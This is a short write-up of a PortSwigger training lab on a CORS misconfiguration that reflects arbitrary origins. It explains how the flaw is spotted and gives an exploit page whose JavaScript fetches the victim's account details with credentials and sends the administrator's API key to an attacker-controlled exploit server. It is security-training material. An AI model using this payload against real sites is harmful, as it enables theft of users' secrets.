https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

This website has an insecure CORS configuration in that it trusts all origins.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter




1) on /accountDetails request we can see that there is Access-Control-Allow-Credentials: true so it uses CORS


2) try to insert in the request Origin: test.com and see that in the response we obtain Access-Control-Allow-Origin: test.com
    so it easily reflect the origin and for this reason is vulnerable to CORS vulnerability

3) if we force another user to perform a request to /accountDetails we can steal the information of this user 
    by the fact that the CORS is misconfigured then we can use the exploit that performs this request when the user visit our malicious page


EXPLOIT:


in this case the server reflects the origin, so we are allowed perform the actions:


<html>
<script>
fetch("https://**************************LAB-ID***************.web-security-academy.net/accountDetails", 
    {
    //without it the victim cannot send the data, so will not obtain it in return
    credentials: 'include',
    })
  .then(response => {
    return response.json();
  })
  .then(data => {
          fetch("https://exploit-***********EX-ID*********.exploit-server.net/?apikey="+data.apikey)
  })
</script>
</html>
